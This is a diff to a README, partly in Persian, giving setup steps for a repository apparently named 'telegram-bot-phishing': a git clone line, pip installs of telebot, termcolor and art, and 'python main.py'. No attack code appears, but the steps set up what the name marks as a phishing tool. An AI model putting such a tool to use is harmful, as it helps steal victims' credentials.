@@ -23,8 +23,18 @@ git clone https://github.com/inits5/telegram-bot-phishing
 ```
 pip install telebot
 ```
+```
+pip install termcolor
+```
+```
+pip install art
+```
 
-و کتابخونه تلبات رو نصب میکنید
+#or
+```
+pip install telebot termcolor art 
+```
+و کتابخونه ها رو نصب میکنید
 
 ```
 python main.py
